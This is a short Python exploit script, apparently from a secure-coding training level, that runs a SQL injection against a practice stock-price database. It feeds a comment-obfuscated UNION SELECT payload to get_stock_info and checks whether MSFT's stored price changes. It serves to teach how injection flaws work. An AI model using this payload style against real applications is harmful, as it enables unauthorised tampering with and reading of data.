'''
Please note:

The first file that you should run in this level is tests.py for database creation, with all tests passing.
Remember that running the hack.py will change the state of the database, causing some tests inside tests.py
to fail.

If you like to return to the initial state of the database, please delete the database (level-4.db) and run 
the tests.py again to recreate it.
'''

import code as c

def main():
    op = c.DB_CRUD_ops()
    
    # Get the original stock price
    original_price_output = op.get_stock_price('MSFT')
    original_price = float(original_price_output.split("[RESULT] (")[1].split(',')[0])
    print(f"Original stock price of MSFT: {original_price}")
    
    # SQL Injection attack: Bypassing using comment and logical operator
    malicious_input = "MSFT'/**/AND/**/1=0/**/UNION/**/SELECT/**/'2022-01-06',/**/'MSFT',/**/500.0/**/WHERE/**/'1'='1"
    print(f"\nExecuting SQL Injection attack with input: {malicious_input}")
    actual_output = op.get_stock_info(malicious_input)
    print(actual_output)
    
    # Check if the stock price has been updated
    updated_price_output = op.get_stock_price('MSFT')
    updated_price = float(updated_price_output.split("[RESULT] (")[1].split(',')[0])
    print(f"\nUpdated stock price of MSFT: {updated_price}")
    
    if updated_price != original_price:
        print("\nSQL Injection attack was successful!")
        print(f"Stock price changed from {original_price} to {updated_price}")
    else:
        print("\nSQL Injection attack failed. Stock price remains unchanged.")

if __name__ == '__main__':
    main()